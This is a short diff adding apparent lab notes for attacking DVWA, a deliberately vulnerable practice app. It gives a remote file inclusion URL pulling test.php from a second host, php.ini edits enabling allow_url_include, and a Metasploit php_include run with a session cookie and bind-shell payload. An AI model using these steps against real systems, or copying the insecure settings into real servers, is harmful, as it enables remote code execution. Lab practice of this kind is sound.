@@ -1,0 +1,16 @@
+http://172.16.1.102/dvwa/vulnerabilities/fi/?page=http://172.16.1.100/test.php
+
+exploit/linux/http/nginx_chunked_size
+auxiliary/scanner/http/wordpress_ghost_scanner
+sudo nano /etc/php5/cgi/php.ini
+allow_url_fopen and allow_url_include are both set to On. Press Ctrl-X, Y, and Enter
+sudo /etc/init.d/apache2 restart
+nano /var/www/html/test.php
+service apache2 restart
+msf exploit(unix/webapp/php_include) > set rhost 172.16.1.102
+msf exploit(unix/webapp/php_include) > set headers "Cookie:security=low; PHPSESSID=4c0c7c70dfafab05e7d04c88c8966aee"
+headers => Cookie:security=low; PHPSESSID=4c0c7c70dfafab05e7d04c88c8966aee
+msf exploit(unix/webapp/php_include) > set path /dvwa/vulnerabilities/fi/
+msf exploit(unix/webapp/php_include) > set phpuri /?page=XXpathXX
+msf exploit(unix/webapp/php_include) > set payload php/bind_php
+msf exploit(unix/webapp/php_include) > run
